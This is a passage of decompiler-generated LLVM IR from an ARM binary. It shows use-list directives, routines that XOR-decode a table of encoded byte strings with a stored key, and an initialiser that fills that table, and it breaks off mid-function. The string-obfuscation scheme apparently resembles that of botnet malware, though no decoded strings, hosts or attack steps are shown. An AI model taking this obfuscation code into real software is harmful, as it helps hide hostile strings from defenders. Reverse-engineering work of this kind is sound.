  uselistorder i32 ptrtoint ([6 x i8]* @global_var_15910.221 to i32), { 0, 18, 1, 19, 2, 20, 3, 21, 4, 22, 5, 23, 6, 24, 7, 25, 8, 26, 9, 27, 10, 28, 11, 29, 12, 30, 13, 31, 14, 32, 15, 16, 17, 33 }
  uselistorder i32 (i32, i32, i32)* @function_101cc, { 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_15908.217 to i32), { 3, 23, 4, 24, 5, 25, 6, 26, 7, 27, 8, 28, 9, 29, 10, 30, 11, 31, 12, 32, 13, 33, 14, 34, 15, 35, 16, 36, 17, 37, 18, 38, 19, 39, 20, 40, 21, 41, 22, 42, 2, 1, 0, 43 }
  uselistorder i8* @global_var_1e415.215, { 1, 0 }
  uselistorder i8 64, { 6, 0, 1, 7, 2, 3, 4, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1e408.206 to i32), { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* @global_var_1e414.207, { 1, 0 }
  uselistorder i8** @global_var_1e3f4.202, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i8** @global_var_1e3f4.202 to i32), { 0, 1, 7, 2, 6, 5, 4, 3 }
  uselistorder i32 1024, { 0, 2, 3, 4, 5, 6, 1, 7 }
  uselistorder i32 65280, { 49, 1, 15, 0, 2, 29, 3, 30, 22, 23, 4, 31, 16, 24, 32, 33, 5, 6, 34, 17, 7, 35, 25, 18, 19, 26, 27, 28, 36, 37, 38, 8, 39, 9, 10, 40, 11, 41, 42, 20, 43, 44, 12, 45, 46, 21, 47, 48, 13, 50, 14, 51 }
  uselistorder i32 ()* @function_fe24, { 22, 21, 20, 19, 18, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 8, 7, 6, 5, 4, 3, 2, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 17, 16, 15, 14, 13, 12, 11, 10, 9, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32*, i32)* @function_13760, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 2048, { 11, 10, 0, 1, 2, 3, 6, 7, 5, 8, 4, 9, 12 }
  uselistorder i32* @global_var_1e88c.200, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 ptrtoint (i8* @global_var_1e48c.198 to i32), { 3, 14, 4, 13, 0, 1, 12, 5, 11, 2, 10, 6, 9, 7, 8 }
  uselistorder i32* @global_var_1e488.196, { 1, 2, 4, 3, 0 }
  uselistorder i32 288, { 1, 2, 5, 6, 0, 7, 3, 4, 8 }
  uselistorder i32* @global_var_1e424.184, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32 (i32*)* @function_1316c, { 4, 5, 6, 0, 1, 2, 3, 9, 7, 8 }
  uselistorder i32* @global_var_1e46c.86, { 3, 4, 2, 0, 5, 1, 6, 13, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 ()* @function_12794, { 0, 2, 1 }
  uselistorder i32* @global_var_1e890.182, { 0, 2, 1 }
  uselistorder i32 ()* @function_12ec8, { 3, 2, 5, 4, 1, 0 }
  uselistorder i32* @fp, { 43, 44, 45, 46, 36, 37, 38, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 1, 33, 34, 35, 39, 2, 40, 41, 42 }
  uselistorder i32* @sl, { 2, 3, 4, 5, 6, 79, 80, 63, 64, 65, 7, 10, 8, 9, 1, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 0, 103, 104, 105, 106 }
  uselistorder i32* @sb, { 50, 51, 52, 0, 53, 54, 55, 56, 41, 42, 43, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 45, 46, 47, 48, 49, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66 }
  uselistorder label %dec_label_pc_11b1c, { 1, 0 }
  uselistorder label %dec_label_pc_11a78, { 1, 0 }
  uselistorder label %dec_label_pc_119bc, { 1, 0 }
  uselistorder label %dec_label_pc_11910, { 1, 0 }
  uselistorder label %dec_label_pc_118d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_118b8, { 1, 0 }
  uselistorder label %dec_label_pc_11790, { 3, 4, 11, 5, 6, 7, 8, 9, 10, 1, 2, 0 }
  uselistorder label %dec_label_pc_11698, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_11684, { 1, 0 }
  uselistorder label %dec_label_pc_115e4, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_115d0, { 1, 0 }
  uselistorder label %dec_label_pc_11530, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1151c, { 1, 0 }
  uselistorder label %dec_label_pc_114a4, { 1, 0 }
  uselistorder label %dec_label_pc_11498, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_11484, { 1, 0 }
  uselistorder label %dec_label_pc_11304, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_112f0, { 1, 0 }
  uselistorder label %dec_label_pc_11250, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_1123c, { 1, 0 }
  uselistorder label %dec_label_pc_111b8, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_111a4, { 1, 0 }
  uselistorder label %dec_label_pc_11160, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder label %dec_label_pc_11150, { 6, 4, 0, 1, 3, 2, 5 }
  uselistorder label %bb298, { 2, 1, 0 }
  uselistorder label %bb296, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11100, { 1, 0 }
  uselistorder label %dec_label_pc_110ec, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_110a8, { 1, 0 }
  uselistorder label %dec_label_pc_110a8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1103c, { 1, 0 }
  uselistorder label %bb294, { 1, 0 }
  uselistorder label %dec_label_pc_10ff0, { 1, 0 }
  uselistorder label %dec_label_pc_10fe0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10fd8thread-pre-split, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder label %dec_label_pc_10fd8thread-pre-split.thread, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10fe0.lr.ph, { 1, 0 }
  uselistorder label %dec_label_pc_10fd4.loopexit, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_10f94, { 2, 0, 1 }
  uselistorder label %bb291, { 1, 0 }
  uselistorder label %bb289, { 1, 0 }
  uselistorder label %dec_label_pc_10e90, { 6, 7, 2, 4, 0, 5, 1, 3 }
  uselistorder label %dec_label_pc_10e68, { 1, 0 }
  uselistorder label %bb286, { 1, 0 }
  uselistorder label %bb284, { 1, 2, 3, 0, 5, 4 }
  uselistorder label %dec_label_pc_10cc0.dec_label_pc_10cc0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10ca8.dec_label_pc_10ca8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10ca0, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_10c98, { 1, 0 }
  uselistorder label %dec_label_pc_10b08.backedge, { 0, 10, 9, 8, 3, 2, 7, 6, 5, 4, 1 }
  uselistorder label %dec_label_pc_10c44, { 1, 0 }
  uselistorder label %dec_label_pc_10af8, { 1, 0 }
  uselistorder label %dec_label_pc_1098c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10968, { 1, 0 }
  uselistorder label %dec_label_pc_1095c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10938, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10914, { 1, 0 }
  uselistorder label %bb256, { 1, 0 }
  uselistorder label %dec_label_pc_108c0, { 22, 6, 7, 2, 8, 3, 9, 4, 10, 5, 11, 0, 12, 13, 14, 15, 16, 17, 18, 19, 1, 20, 21, 23 }
  uselistorder label %dec_label_pc_104ac, { 1, 0 }
}

define i32 @function_11b24(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_11b24:
  %v3_11b28 = mul i32 %arg1, 8
  %v2_11b2c = add i32 %v3_11b28, ptrtoint (i32* @global_var_1e898.323 to i32)
  %v2_11b30 = icmp eq i32* %arg2, null
  br i1 %v2_11b30, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_11b24
  %v3_11b3c11 = inttoptr i32 %v2_11b2c to i32*
  %v4_11b3c12 = load i32, i32* %v3_11b3c11, align 4
  br label %bb15

bb:                                               ; preds = %dec_label_pc_11b24
  %v2_11b34 = add i32 %v3_11b28, add (i32 ptrtoint (i32* @global_var_1e898.323 to i32), i32 5)
  %v3_11b34 = inttoptr i32 %v2_11b34 to i8*
  %v4_11b34 = load i8, i8* %v3_11b34, align 1
  %v5_11b34 = zext i8 %v4_11b34 to i32
  store i32 %v5_11b34, i32* @r2, align 4
  %v2_11b38 = add i32 %v3_11b28, add (i32 ptrtoint (i32* @global_var_1e898.323 to i32), i32 4)
  %v3_11b38 = inttoptr i32 %v2_11b38 to i8*
  %v4_11b38 = load i8, i8* %v3_11b38, align 4
  %v5_11b38 = zext i8 %v4_11b38 to i32
  %v3_11b3c = inttoptr i32 %v2_11b2c to i32*
  %v4_11b3c = load i32, i32* %v3_11b3c, align 4
  %v5_11b40 = mul nuw nsw i32 %v5_11b34, 256
  %v6_11b40 = or i32 %v5_11b38, %v5_11b40
  store i32 %v6_11b40, i32* %arg2, align 4
  br label %bb15

bb15:                                             ; preds = %.thread, %bb
  %v4_11b3c714 = phi i32 [ %v4_11b3c12, %.thread ], [ %v4_11b3c, %bb ]
  ret i32 %v4_11b3c714

; uselistorder directives
  uselistorder i32 %v2_11b2c, { 1, 0 }
  uselistorder i32 %v3_11b28, { 2, 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @function_11b50(i32 %arg1) local_unnamed_addr {
dec_label_pc_11b50:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11b50 = mul i32 %arg1, 8
  %v3_11b54 = load i32, i32* @r4, align 4
  store i32 %v3_11b54, i32* %stack_var_-20, align 4
  %v3_11b64 = and i32 %v3_11b50, 2040
  %v2_11b68 = add i32 %v3_11b64, ptrtoint (i32* @global_var_1e898.323 to i32)
  store i32 %v2_11b68, i32* @lr, align 4
  %v1_11b70 = add i32 %v3_11b64, add (i32 ptrtoint (i32* @global_var_1e898.323 to i32), i32 4)
  store i32 %v1_11b70, i32* %r7.global-to-local, align 4
  %v2_11b74 = load i32, i32* @global_var_1e24c.326, align 4
  %v2_11b78 = inttoptr i32 %v1_11b70 to i8*
  %v3_11b78 = load i8, i8* %v2_11b78, align 4
  %v4_11b78 = zext i8 %v3_11b78 to i32
  store i32 %v4_11b78, i32* @r1, align 4
  %v1_11b7c = add i32 %v3_11b64, add (i32 ptrtoint (i32* @global_var_1e898.323 to i32), i32 5)
  %v2_11b7c = inttoptr i32 %v1_11b7c to i8*
  %v3_11b7c = load i8, i8* %v2_11b7c, align 1
  %v4_11b7c = zext i8 %v3_11b7c to i32
  %v3_11b80 = udiv i32 %v2_11b74, 256
  %v4_11b84 = mul nuw nsw i32 %v4_11b7c, 256
  %v5_11b84 = or i32 %v4_11b84, %v4_11b78
  %v7_11b84 = icmp eq i32 %v5_11b84, 0
  store i1 %v7_11b84, i1* @cpsr_z, align 1
  %v3_11b88 = udiv i32 %v2_11b74, 65536
  %v1_11b8c = urem i32 %v3_11b80, 256
  store i32 %v1_11b8c, i32* %r6.global-to-local, align 4
  %v1_11b90 = urem i32 %v3_11b88, 256
  store i32 %v1_11b90, i32* %r5.global-to-local, align 4
  %v3_11b94 = udiv i32 %v2_11b74, 16777216
  store i32 %v3_11b94, i32* %r4.global-to-local, align 4
  %v1_11b98 = urem i32 %v2_11b74, 256
  br i1 %v7_11b84, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_11b50
  store i32 %v3_11b54, i32* @r4, align 4
  ret i32 %v1_11b98

bb8:                                              ; preds = %dec_label_pc_11b50
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11ba4

dec_label_pc_11ba4:                               ; preds = %dec_label_pc_11ba4, %bb8
  %v2_11bb0 = phi i32 [ %v1_11bec, %dec_label_pc_11ba4 ], [ 0, %bb8 ]
  %v0_11ba4 = phi i32 [ %v0_11be4, %dec_label_pc_11ba4 ], [ %v2_11b68, %bb8 ]
  %v1_11ba4 = inttoptr i32 %v0_11ba4 to i32*
  %v2_11ba4 = load i32, i32* %v1_11ba4, align 4
  %v2_11ba8 = add i32 %v2_11ba4, %v2_11bb0
  %v3_11ba8 = inttoptr i32 %v2_11ba8 to i8*
  %v4_11ba8 = load i8, i8* %v3_11ba8, align 1
  %v6_11ba8 = zext i8 %v4_11ba8 to i32
  %v2_11bac = xor i32 %v6_11ba8, %v1_11b98
  %v1_11bb0 = trunc i32 %v2_11bac to i8
  store i8 %v1_11bb0, i8* %v3_11ba8, align 1
  %v0_11bb4 = load i32, i32* @lr, align 4
  %v1_11bb4 = inttoptr i32 %v0_11bb4 to i32*
  %v2_11bb4 = load i32, i32* %v1_11bb4, align 4
  %v0_11bb8 = load i32, i32* %ip.global-to-local, align 4
  %v2_11bb8 = add i32 %v0_11bb8, %v2_11bb4
  %v3_11bb8 = inttoptr i32 %v2_11bb8 to i8*
  %v4_11bb8 = load i8, i8* %v3_11bb8, align 1
  %v6_11bb8 = zext i8 %v4_11bb8 to i32
  %v0_11bbc = load i32, i32* %r6.global-to-local, align 4
  %v2_11bbc = xor i32 %v0_11bbc, %v6_11bb8
  %v1_11bc0 = trunc i32 %v2_11bbc to i8
  store i8 %v1_11bc0, i8* %v3_11bb8, align 1
  %v0_11bc4 = load i32, i32* @lr, align 4
  %v1_11bc4 = inttoptr i32 %v0_11bc4 to i32*
  %v2_11bc4 = load i32, i32* %v1_11bc4, align 4
  %v0_11bc8 = load i32, i32* %ip.global-to-local, align 4
  %v2_11bc8 = add i32 %v0_11bc8, %v2_11bc4
  %v3_11bc8 = inttoptr i32 %v2_11bc8 to i8*
  %v4_11bc8 = load i8, i8* %v3_11bc8, align 1
  %v6_11bc8 = zext i8 %v4_11bc8 to i32
  %v0_11bcc = load i32, i32* %r5.global-to-local, align 4
  %v2_11bcc = xor i32 %v0_11bcc, %v6_11bc8
  %v1_11bd0 = trunc i32 %v2_11bcc to i8
  store i8 %v1_11bd0, i8* %v3_11bc8, align 1
  %v0_11bd4 = load i32, i32* @lr, align 4
  %v1_11bd4 = inttoptr i32 %v0_11bd4 to i32*
  %v2_11bd4 = load i32, i32* %v1_11bd4, align 4
  store i32 %v2_11bd4, i32* @r1, align 4
  %v0_11bd8 = load i32, i32* %ip.global-to-local, align 4
  %v2_11bd8 = add i32 %v0_11bd8, %v2_11bd4
  %v3_11bd8 = inttoptr i32 %v2_11bd8 to i8*
  %v4_11bd8 = load i8, i8* %v3_11bd8, align 1
  %v6_11bd8 = zext i8 %v4_11bd8 to i32
  %v0_11bdc = load i32, i32* %r4.global-to-local, align 4
  %v2_11bdc = xor i32 %v0_11bdc, %v6_11bd8
  %v1_11be0 = trunc i32 %v2_11bdc to i8
  store i8 %v1_11be0, i8* %v3_11bd8, align 1
  %v0_11be4 = load i32, i32* @lr, align 4
  %v1_11be4 = add i32 %v0_11be4, 4
  %v2_11be4 = inttoptr i32 %v1_11be4 to i8*
  %v3_11be4 = load i8, i8* %v2_11be4, align 1
  %v4_11be4 = zext i8 %v3_11be4 to i32
  %v0_11be8 = load i32, i32* %r7.global-to-local, align 4
  %v1_11be8 = add i32 %v0_11be8, 1
  %v2_11be8 = inttoptr i32 %v1_11be8 to i8*
  %v3_11be8 = load i8, i8* %v2_11be8, align 1
  %v4_11be8 = zext i8 %v3_11be8 to i32
  %v0_11bec = load i32, i32* %ip.global-to-local, align 4
  %v1_11bec = add i32 %v0_11bec, 1
  store i32 %v1_11bec, i32* %ip.global-to-local, align 4
  %v4_11bf0 = mul nuw nsw i32 %v4_11be8, 256
  %v5_11bf0 = or i32 %v4_11bf0, %v4_11be4
  %v9_11bf4 = icmp eq i32 %v5_11bf0, %v1_11bec
  store i1 %v9_11bf4, i1* @cpsr_z, align 1
  %v8_11bf8 = icmp sgt i32 %v5_11bf0, %v1_11bec
  br i1 %v8_11bf8, label %dec_label_pc_11ba4, label %dec_label_pc_11bfc

dec_label_pc_11bfc:                               ; preds = %dec_label_pc_11ba4
  %v2_11bfc = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11bfc, i32* @r4, align 4
  ret i32 %v1_11b98

; uselistorder directives
  uselistorder i32 %v1_11bec, { 1, 2, 3, 0 }
  uselistorder i32 %v0_11be4, { 1, 0 }
  uselistorder i32 %v1_11b98, { 0, 2, 1 }
  uselistorder i32 %v2_11b74, { 3, 0, 1, 2 }
}

define i32 @function_11c08(i32 %arg1) local_unnamed_addr {
dec_label_pc_11c08:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_11c08 = mul i32 %arg1, 8
  %v3_11c0c = load i32, i32* @r4, align 4
  store i32 %v3_11c0c, i32* %stack_var_-20, align 4
  %v3_11c1c = and i32 %v3_11c08, 2040
  %v2_11c20 = add i32 %v3_11c1c, ptrtoint (i32* @global_var_1e898.323 to i32)
  store i32 %v2_11c20, i32* @lr, align 4
  %v1_11c28 = add i32 %v3_11c1c, add (i32 ptrtoint (i32* @global_var_1e898.323 to i32), i32 4)
  store i32 %v1_11c28, i32* %r7.global-to-local, align 4
  %v2_11c2c = load i32, i32* @global_var_1e24c.326, align 4
  store i32 %v2_11c2c, i32* @r2, align 4
  %v2_11c30 = inttoptr i32 %v1_11c28 to i8*
  %v3_11c30 = load i8, i8* %v2_11c30, align 4
  %v4_11c30 = zext i8 %v3_11c30 to i32
  %v1_11c34 = add i32 %v3_11c1c, add (i32 ptrtoint (i32* @global_var_1e898.323 to i32), i32 5)
  %v2_11c34 = inttoptr i32 %v1_11c34 to i8*
  %v3_11c34 = load i8, i8* %v2_11c34, align 1
  %v4_11c34 = zext i8 %v3_11c34 to i32
  %v3_11c38 = udiv i32 %v2_11c2c, 256
  %v4_11c3c = mul nuw nsw i32 %v4_11c34, 256
  %v5_11c3c = or i32 %v4_11c3c, %v4_11c30
  %v7_11c3c = icmp eq i32 %v5_11c3c, 0
  %v3_11c40 = udiv i32 %v2_11c2c, 65536
  %v1_11c44 = urem i32 %v3_11c38, 256
  store i32 %v1_11c44, i32* %r6.global-to-local, align 4
  %v1_11c48 = urem i32 %v3_11c40, 256
  store i32 %v1_11c48, i32* %r5.global-to-local, align 4
  %v3_11c4c = udiv i32 %v2_11c2c, 16777216
  store i32 %v3_11c4c, i32* %r4.global-to-local, align 4
  %v1_11c50 = urem i32 %v2_11c2c, 256
  br i1 %v7_11c3c, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_11c08
  store i32 %v3_11c0c, i32* @r4, align 4
  ret i32 %v1_11c50

bb8:                                              ; preds = %dec_label_pc_11c08
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11c5c

dec_label_pc_11c5c:                               ; preds = %dec_label_pc_11c5c, %bb8
  %v2_11c68 = phi i32 [ %v1_11ca4, %dec_label_pc_11c5c ], [ 0, %bb8 ]
  %v0_11c5c = phi i32 [ %v0_11c9c, %dec_label_pc_11c5c ], [ %v2_11c20, %bb8 ]
  %v1_11c5c = inttoptr i32 %v0_11c5c to i32*
  %v2_11c5c = load i32, i32* %v1_11c5c, align 4
  %v2_11c60 = add i32 %v2_11c5c, %v2_11c68
  %v3_11c60 = inttoptr i32 %v2_11c60 to i8*
  %v4_11c60 = load i8, i8* %v3_11c60, align 1
  %v6_11c60 = zext i8 %v4_11c60 to i32
  %v2_11c64 = xor i32 %v6_11c60, %v1_11c50
  %v1_11c68 = trunc i32 %v2_11c64 to i8
  store i8 %v1_11c68, i8* %v3_11c60, align 1
  %v0_11c6c = load i32, i32* @lr, align 4
  %v1_11c6c = inttoptr i32 %v0_11c6c to i32*
  %v2_11c6c = load i32, i32* %v1_11c6c, align 4
  %v0_11c70 = load i32, i32* %ip.global-to-local, align 4
  %v2_11c70 = add i32 %v0_11c70, %v2_11c6c
  %v3_11c70 = inttoptr i32 %v2_11c70 to i8*
  %v4_11c70 = load i8, i8* %v3_11c70, align 1
  %v6_11c70 = zext i8 %v4_11c70 to i32
  %v0_11c74 = load i32, i32* %r6.global-to-local, align 4
  %v2_11c74 = xor i32 %v0_11c74, %v6_11c70
  %v1_11c78 = trunc i32 %v2_11c74 to i8
  store i8 %v1_11c78, i8* %v3_11c70, align 1
  %v0_11c7c = load i32, i32* @lr, align 4
  %v1_11c7c = inttoptr i32 %v0_11c7c to i32*
  %v2_11c7c = load i32, i32* %v1_11c7c, align 4
  %v0_11c80 = load i32, i32* %ip.global-to-local, align 4
  %v2_11c80 = add i32 %v0_11c80, %v2_11c7c
  %v3_11c80 = inttoptr i32 %v2_11c80 to i8*
  %v4_11c80 = load i8, i8* %v3_11c80, align 1
  %v6_11c80 = zext i8 %v4_11c80 to i32
  %v0_11c84 = load i32, i32* %r5.global-to-local, align 4
  %v2_11c84 = xor i32 %v0_11c84, %v6_11c80
  %v1_11c88 = trunc i32 %v2_11c84 to i8
  store i8 %v1_11c88, i8* %v3_11c80, align 1
  %v0_11c8c = load i32, i32* @lr, align 4
  %v1_11c8c = inttoptr i32 %v0_11c8c to i32*
  %v2_11c8c = load i32, i32* %v1_11c8c, align 4
  %v0_11c90 = load i32, i32* %ip.global-to-local, align 4
  %v2_11c90 = add i32 %v0_11c90, %v2_11c8c
  %v3_11c90 = inttoptr i32 %v2_11c90 to i8*
  %v4_11c90 = load i8, i8* %v3_11c90, align 1
  %v6_11c90 = zext i8 %v4_11c90 to i32
  %v0_11c94 = load i32, i32* %r4.global-to-local, align 4
  %v2_11c94 = xor i32 %v0_11c94, %v6_11c90
  %v1_11c98 = trunc i32 %v2_11c94 to i8
  store i8 %v1_11c98, i8* %v3_11c90, align 1
  %v0_11c9c = load i32, i32* @lr, align 4
  %v1_11c9c = add i32 %v0_11c9c, 4
  %v2_11c9c = inttoptr i32 %v1_11c9c to i8*
  %v3_11c9c = load i8, i8* %v2_11c9c, align 1
  %v4_11c9c = zext i8 %v3_11c9c to i32
  %v0_11ca0 = load i32, i32* %r7.global-to-local, align 4
  %v1_11ca0 = add i32 %v0_11ca0, 1
  %v2_11ca0 = inttoptr i32 %v1_11ca0 to i8*
  %v3_11ca0 = load i8, i8* %v2_11ca0, align 1
  %v4_11ca0 = zext i8 %v3_11ca0 to i32
  %v0_11ca4 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ca4 = add i32 %v0_11ca4, 1
  store i32 %v1_11ca4, i32* %ip.global-to-local, align 4
  %v4_11ca8 = mul nuw nsw i32 %v4_11ca0, 256
  %v5_11ca8 = or i32 %v4_11ca8, %v4_11c9c
  store i32 %v5_11ca8, i32* @r2, align 4
  %v8_11cb0 = icmp sgt i32 %v5_11ca8, %v1_11ca4
  br i1 %v8_11cb0, label %dec_label_pc_11c5c, label %dec_label_pc_11cb4

dec_label_pc_11cb4:                               ; preds = %dec_label_pc_11c5c
  %v2_11cb4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_11cb4, i32* @r4, align 4
  ret i32 %v1_11c50

; uselistorder directives
  uselistorder i32 %v1_11ca4, { 1, 2, 0 }
  uselistorder i32 %v0_11c9c, { 1, 0 }
  uselistorder i32 %v1_11c50, { 0, 2, 1 }
  uselistorder i32 %v2_11c2c, { 3, 0, 1, 2, 4 }
}

define i32 @function_11cc0() local_unnamed_addr {
dec_label_pc_11cc0:
  %fp.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v1_11cc8 = call i32 @function_13940(i32 2)
  store i32 2, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1e898.323 to i32), i32* @r4, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v1_11cc8, i32* @r7, align 4
  %v4_11ce4 = call i32 @function_12558(i32 %v1_11cc8, i32 ptrtoint ([3 x i8]* @global_var_159d0.331 to i32), i32 2)
  %v0_11ce8 = load i32, i32* @r5, align 4
  %v0_11cec = load i32, i32* @r7, align 4
  store i32 %v0_11cec, i32* @global_var_1e8b8.332, align 4
  %v1_11cf0 = trunc i32 %v0_11ce8 to i8
  store i8 %v1_11cf0, i8* bitcast (i32* @global_var_1e8bc.333 to i8*), align 4
  %v0_11cf4 = load i32, i32* @r6, align 4
  %v1_11cf4 = trunc i32 %v0_11cf4 to i8
  store i8 %v1_11cf4, i8* bitcast (i32* @global_var_1e8bd.334 to i8*), align 4
  %v1_11cf8 = call i32 @function_13940(i32 %v0_11ce8)
  %v0_11cfc = load i32, i32* @r5, align 4
  store i32 %v1_11cf8, i32* @r7, align 4
  %v3_11d08 = call i32 @function_12558(i32 %v1_11cf8, i32 ptrtoint (i32* @global_var_159d4.336 to i32), i32 %v0_11cfc)
  %v0_11d10 = load i32, i32* @r7, align 4
  store i32 %v0_11d10, i32* @global_var_1e930.337, align 4
  %v0_11d14 = load i32, i32* @r5, align 4
  %v1_11d14 = trunc i32 %v0_11d14 to i8
  store i8 %v1_11d14, i8* bitcast (i32* @global_var_1e934.338 to i8*), align 4
  %v0_11d18 = load i32, i32* @r6, align 4
  %v1_11d18 = trunc i32 %v0_11d18 to i8
  store i8 %v1_11d18, i8* bitcast (i32* @global_var_1e935.339 to i8*), align 4
  %v1_11d1c = call i32 @function_13940(i32 15)
  store i32 %v1_11d1c, i32* @r5, align 4
  %v3_11d2c = call i32 @function_12558(i32 %v1_11d1c, i32 ptrtoint (i32* @global_var_159d8.341 to i32), i32 15)
  store i8 15, i8* bitcast (i32* @global_var_1e8ac.342 to i8*), align 4
  %v0_11d3c = load i32, i32* @r5, align 4
  store i32 %v0_11d3c, i32* @global_var_1e8a8.343, align 4
  %v0_11d40 = load i32, i32* @r6, align 4
  %v1_11d40 = trunc i32 %v0_11d40 to i8
  store i8 %v1_11d40, i8* bitcast (i32* @global_var_1e8ad.344 to i8*), align 4
  %v1_11d44 = call i32 @function_13940(i32 29)
  store i32 %v1_11d44, i32* @r5, align 4
  %v3_11d54 = call i32 @function_12558(i32 %v1_11d44, i32 ptrtoint (i32* @global_var_159e8.346 to i32), i32 29)
  store i8 29, i8* bitcast (i32* @global_var_1e8c4.347 to i8*), align 4
  %v0_11d64 = load i32, i32* @r5, align 4
  store i32 %v0_11d64, i32* @global_var_1e8c0.348, align 4
  %v0_11d68 = load i32, i32* @r6, align 4
  %v1_11d68 = trunc i32 %v0_11d68 to i8
  store i8 %v1_11d68, i8* bitcast (i32* @global_var_1e8c5.349 to i8*), align 4
  %v1_11d6c = call i32 @function_13940(i32 7)
  store i32 7, i32* @r7, align 4
  store i32 %v1_11d6c, i32* @r5, align 4
  %v4_11d80 = call i32 @function_12558(i32 %v1_11d6c, i32 ptrtoint ([8 x i8]* @global_var_15a08.351 to i32), i32 7)
  %v0_11d88 = load i32, i32* @r5, align 4
  store i32 %v0_11d88, i32* @global_var_1e8c8.352, align 4
  %v0_11d8c = load i32, i32* @r7, align 4
  %v1_11d8c = trunc i32 %v0_11d8c to i8
  store i8 %v1_11d8c, i8* bitcast (i32* @global_var_1e8cc.353 to i8*), align 4
  %v0_11d90 = load i32, i32* @r6, align 4
  %v1_11d90 = trunc i32 %v0_11d90 to i8
  store i8 %v1_11d90, i8* bitcast (i32* @global_var_1e8cd.354 to i8*), align 4
  %v1_11d94 = call i32 @function_13940(i32 5)
  store i32 %v1_11d94, i32* @r5, align 4
  %v4_11da4 = call i32 @function_12558(i32 %v1_11d94, i32 ptrtoint ([6 x i8]* @global_var_15a10.356 to i32), i32 5)
  store i8 5, i8* bitcast (i32* @global_var_1e8d4.357 to i8*), align 4
  %v0_11db4 = load i32, i32* @r5, align 4
  store i32 %v0_11db4, i32* @global_var_1e8d0.358, align 4
  %v0_11db8 = load i32, i32* @r6, align 4
  %v1_11db8 = trunc i32 %v0_11db8 to i8
  store i8 %v1_11db8, i8* bitcast (i32* @global_var_1e8d5.359 to i8*), align 4
  %v1_11dbc = call i32 @function_13940(i32 11)
  store i32 %v1_11dbc, i32* @r5, align 4
